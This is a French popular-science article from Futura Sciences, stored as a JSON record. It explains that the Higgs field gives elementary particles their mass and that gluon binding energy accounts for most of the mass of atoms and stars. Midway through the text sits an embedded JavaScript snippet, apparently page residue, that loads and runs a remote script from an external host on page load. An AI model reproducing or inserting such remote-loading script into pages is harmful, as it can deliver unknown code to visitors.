{"title": "Non, le boson de Higgs n'explique pas la masse du Soleil !", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-05-08", "content": "Vous pensez que le boson de Higgs explique la masse des corps dans l'univers, depuis les atomes jusqu'aux etoiles. C'est faux ! Vous pensez que vous nagez dans une mer de bosons de Higgs autour de vous. C'est faux. D'ailleurs, depuis 13,7 milliards d'annees, les bosons de Higgs n'existent plus dans l'univers, si ce n'est de facon fugace... Vous n'y comprenez plus rien ? Voici de quoi vous eclairer avec des explications sur ce que l'on appelle le champ de Higgs et ses bosons. Ce qu'il faut retenir La majorite de la masse de la matiere normale est sous forme de protons et de neutrons environ 2.000 fois plus lourds qu'un electron chacun. La masse des protons et des neutrons provient de facon ecrasante de l'energie contenue dans la mer de gluons echanges entre les quarks dans ces nucleons. Le champ de Brout-Englert-Higgs donne une masse aux bosons W, Z et probablement aux quarks et aux leptons comme les neutrinos ou l'electron. Ce n'est donc pas ce champ qui explique la masse des objets materiels, que ce soit une roche, l'ocean ou le Soleil. Article publie le 11 juillet 2012 Il n'est pas facile d'expliquer vraiment ce qu'est le  boson de Higgs  et pourquoi il est si important pour les physiciens des  particules elementaires  et meme potentiellement pour les  cosmologistes . Plusieurs images et  analogies  ont ete proposees. Mais comme pour toutes les analogies, elles peuvent etre trompeuses si on les prend au pied de la lettre. Examinons cela d'un peu plus pres. Precisons tout de suite. Il est faux de dire que le  boson de Higgs  explique la  masse  de la  matiere  ordinaire. D'une facon ou d'une autre, il n'explique absolument pas la masse du  Soleil , de la  Terre  ou des  atomes  qui composent les etres humains. Il est incorrect et meme faux dans un certain sens de dire que le boson de Higgs explique la masse des particules elementaires. Tout comme il est faux de dire que l' univers  est rempli de bosons de Higgs et que c'est en heurtant ces bosons que les particules de matiere deviennent massives. Peter Higgs, l'un des physiciens a l'origine du mecanisme de Brout-Englert-Higgs expliquant la masse des particules elementaires. (c) Peter Tuffy-The University of Edinburgh                               Il n'y a pas de boson de Higgs autour de nous, pour le moins, pas plus et pas moins que des paires d'electron- positron  ou de  minitrous noirs  chargees surgissant et disparaissant du vide par suite des fluctuations quantiques. << Mais alors on nous aurait menti ? >>  penseront sans doute bon nombre de lecteurs. Pas du tout ! Si vous lisez ou ecoutez bien ce qui a ete dit par la majorite des physiciens, c'est le champ de Higgs qui donne une masse aux particules elementaires, pas le  boson de Higgs . Mais pourquoi cela change-t-il tout et pourquoi cela n'explique toujours pas la masse des atomes et du Soleil ?  Pierre Fayet, Directeur de recherche CNRS au Laboratoire de physique theorique de l'ENS a Paris, est specialiste de la physique theorique des particules, ses travaux ont notamment porte sur la supersymetrie. Il repond a 3 questions sur l'apport des physiciens theoriciens dans la decouverte du boson de Higgs.(c) INP-CNRS Un univers de champs Pour le comprendre, il faut saisir la difference entre un champ et une excitation de champ, c'est-a-dire la difference entre l'ocean et une  vague  sur l'ocean ou encore l'eau d'une piscine et le son qui s'y propage.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Commencons par expliquer ce qu'est un champ. Pour un physicien, c'est la donnee en tout point de l'espace d'un ou plusieurs nombres decrivant une realite  physique  donnee. Prenons le cas de l' atmosphere  a la surface de la Terre. En tout point, un  thermometre  ou un  barometre  permet d'observer et de definir une temperature et une pression. Il existe donc un champ de temperature et un champ de pression.  Ces champs sont definis par des quantites dites scalaires. Pourquoi ce mot ? Tout simplement parce que scala en latin signifie << echelle >>, <<  escalier  >> et que bien sur quand la temperature monte, le  liquide  dans un thermometre grimpe le long des graduations comme on franchirait les barreaux d'une echelle. Mais dans l' atmosphere , il existe aussi du  vent . Pour le caracteriser, on utilise des  anemometres  qui mesurent une  vitesse  dans une direction et un sens donnes en chaque point de la Terre (idealement bien sur). Une direction, un sens et une intensite d'une grandeur, comme la vitesse, c'est un vecteur pour un physicien. On a donc defini un champ de vecteur. Tout comme dans l' air , on peut definir ces quantites dans l'ocean et a la surface des oceans. On peut aussi parler de champ de densite de l'air et de l'eau. Dans l'eau et dans l'air, des chocs generent des  ondes sonores  qui sont des variations des champs de pression. Si l'on fait tomber une pierre a la surface de l'eau, des ondes vont etre produites. Quand elles atteindront un bouchon flottant pas trop loin du point de chute de la pierre, elles provoqueront le  mouvement  du bouchon. Si celui-ci est trop loin, les ondes auront eu le temps de se dissiper completement et aucun mouvement n'en resultera. Sur cette video sont reconstitues sur ordinateur, les mouvements et les courants complexes dans les oceans de la Planete. On peut les definir par des champs de vecteurs sur une sphere donnant la direction et la vitesse des ecoulements d'eau. Les equations gouvernant dans le temps et l'espace les modifications de ce champ de vecteur vitesse decrivent l'evolution des courants oceaniques. Des equations similaires avec d'autres champs de vecteurs, ou des champs scalaires comme la temperature, la densite de l'eau, sont utilisees en physique. On peut meme dire que toute la physique s'ecrit avec des champs et des equations de champs. (c) NasaExplorer-YouTube Pour les physiciens, il existe certains champs fondamentaux qui ne sont pas, comme pour les ondes sonores, le  vent  ou les vagues, des mouvements ou des oscillations d'un milieu materiel mais bien ce dont sont construites la matiere et les forces agissant sur la matiere. Les plus connus sont le  champ electromagnetique  ou le champ de  gravitation . Mais il existe aussi des champs de matiere a l'origine des electrons, des  quarks  et des  neutrinos . Les particules, les paquets d'energie des champs en mouvements Si l'on prend l'exemple de l'eau au repos dans une piscine, lorsqu'une onde sonore ou une onde de surface se produit suite a la chute d'un caillou, ces ondes transportent de l' energie . Mais en l'absence de ces ondes, l'eau est tout de meme bel et bien la. La  physique quantique  nous apprend que l'energie des ondes se presente sous forme de paquets discrets, des quanta d'energie. Dans le cas d'une  onde electromagnetique , ces paquets sont des  photons . Dans le cas du son dans un  solide , ces paquets sont des  phonons , et pour une onde dans un champ electronique, ces paquets sont des electrons ou des positrons. On peut maintenant comprendre ce que les physiciens veulent dire lorsqu'ils affirment que l'existence du champ de Higgs donne une masse aux particules elementaires. Prenons toujours l'exemple de la piscine et etablissons un dictionnaire d'analogies. Le champ de Higgs sera l'eau dans la piscine et le boson de Higgs sera le quanta d'energie des ondes dans le champ de Higgs tout comme il peut y avoir des ondes sonores quand deux nageurs se heurtent dans la piscine. Selon la taille et la forme d'un objet, il sera plus ou moins facile de le mettre en mouvement dans l'eau. Dans le vide ou dans de l'eau sous forme gazeuse tres peu dense, ces differences seraient eliminees ou negligeables.  Or , la masse, ou encore de maniere plus precise l' inertie  d'un objet, est bien une certaine mesure de la difficulte que l'on a a mettre en mouvement, a deplacer cet objet. Ainsi, dans un certain sens, ces objets ont une masse parce qu'ils interagissent avec l'eau.  Or, rappelons-le, dans le dictionnaire que l'on a etabli precedemment, le champ de Higgs est l'eau, le boson de Higgs est le quanta d'energie d'une onde sonore ou d'une onde de surface, une vague, sur l'eau. On comprend maintenant qu'il est absurde de dire qu'un objet peine a se deplacer dans l'eau, qu'il a une masse, parce qu'il y a des ondes sonores. C'est d'autant plus faux que le phenomene existe meme quand il n'y a aucune onde sonore. Dans cette video en anglais, l'analogie entre le champ de Higgs et l'effet de l'eau sur des objets est reprise. Mais attention, a la fin de la video, il faut bien garder present a l'esprit que les bosons de Higgs constituent le champ de Higgs quand celui-ci est en mouvement et oscille a la facon des ondes sonores dans l'eau ou a celle des ondes de surface, comme des vagues. Protons et neutrons ne sont pas constitues de quarks top (t) mais de quarks up (u) et down (d). Pour obtenir une traduction en francais assez fidele, cliquez sur << cc >> pour que s'affichent d'abord des sous-titres en anglais si ceux-ci n'apparaissent pas deja. En passant simplement la souris sur << cc >>, apparaitra << Traduire les sous-titres >>. Cliquez pour faire apparaitre le menu du choix de la langue, choisissez << francais >> puis << ok >>. (c) fermilab-YouTube Resumons : ce n'est pas le boson de Higgs mais bien le champ de Higgs qui peut servir a expliquer la masse de particules. En general, il n'existe pas de bosons de Higgs autour de nous, notamment car ils sont trop lourds. Tout comme pour des ondes sonores ou des vagues dans une piscine, il faut des chocs entre des particules (dans le cas du  LHC , des  protons ) pour exciter le champ de Higgs et donc fabriquer des bosons de Higgs. Tout comme les ondes sonores, ces bosons vont se dissiper rapidement. Les gluons, la cle de la masse des atomes, des humains et des etoiles Abordons maintenant un dernier point. Pourquoi est-il aussi totalement faux de dire que le champ de Higgs explique la masse du Soleil ou des atomes ? Tout simplement parce que le champ de Higgs donne une masse aux particules elementaires, or les protons et les  neutrons  ne sont pas elementaires. Ils sont formes de  quarks  lies fortement par des  gluons . Les quarks constituant un proton ou un neutron sont au nombre de trois. Pour un proton, il y a deux quarks u et un  quark d . Ils peseraient respectivement 3 MeV pour chaque quarks u et 6 MeV pour le quark d, alors que le proton lui-meme pese 938 MeV (on rappelle que grace a la relation d' Einstein  E=mc 2 , il est d'usage de donner les masses des particules en equivalent d'energie). La question de la determination exacte de la masse des quarks dans un  hadron  est fort complexe et l'un des quarks pourrait meme avoir une masse nulle. Mais ce qui est sur c'est qu'ils ne portent qu'une tres faible partie de la masse d'un proton ou d'un neutron.  Pour expliquer la difference, il faut faire intervenir une mer de gluons echanges entre les quarks et qui, par l'energie de liaison qu'ils representent, vont constituer l'essentiel de la  masse du proton . Comme un  electron  est environ 2.000 fois plus leger qu'un proton ou un neutron, il en resulte que la masse des atomes est portee tres majoritairement par les protons et les neutrons des noyaux. Ce sont donc d'autres bosons que celui de  Peter Higgs , les gluons, qui expliquent la masse des objets autour de nous.  Quel est l'interet du champ de Higgs ? Quelle peut donc bien etre l'importance de la decouverte du champ de Higgs, se demandera-t-on ? En dehors de verifier l'existence de la derniere piece manquante du  modele standard , les theoriciens sont fascines par le fait que si le champ de Higgs et son boson ne sont pas exactement ceux du modele standard, ils sont peut-etre une cle importante pour expliquer d'ou vient la majeur partie de la masse dans l'univers, c'est-a-dire celle de la  matiere noire  et celle de l' energie noire . Tout semble indiquer que le boson de Higgs a bien ete decouvert avec les detecteurs Atlas et CMS du  LHC . C'est la premiere fois dans l'histoire de la physique que l'on decouvre quelque chose qui n'est ni de la matiere, ni un mediateur d'une force fondamentale. On accede ainsi, via le boson de Higgs, a un territoire entierement nouveau, celui d'un secteur scalaire. C'est pourquoi le  prix Nobel de physique 2013  a ete attribue au deux principaux physiciens ayant postule l'existence du champ de Higgs, Francois Englert et Peter Higgs. ", "theme": "sciences"}